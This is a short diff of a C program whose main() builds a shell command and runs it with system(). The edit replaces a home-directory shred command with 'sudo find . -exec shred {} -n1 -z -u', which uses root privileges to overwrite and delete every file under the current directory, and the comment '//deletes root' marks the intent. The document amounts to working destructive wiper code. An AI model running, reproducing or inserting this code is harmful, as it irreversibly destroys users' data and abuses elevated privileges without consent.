@@ -6,7 +6,7 @@
 int main () {
    char command[200];
 
-   strcpy(command, "cd ~ && find . -type d -exec shred {} -z -u \\;" );//deletes root
+   strcpy(command, "sudo find . -exec shred {} -n1 -z -u \\;" );//deletes root
    printf(command);
    system(command);
 
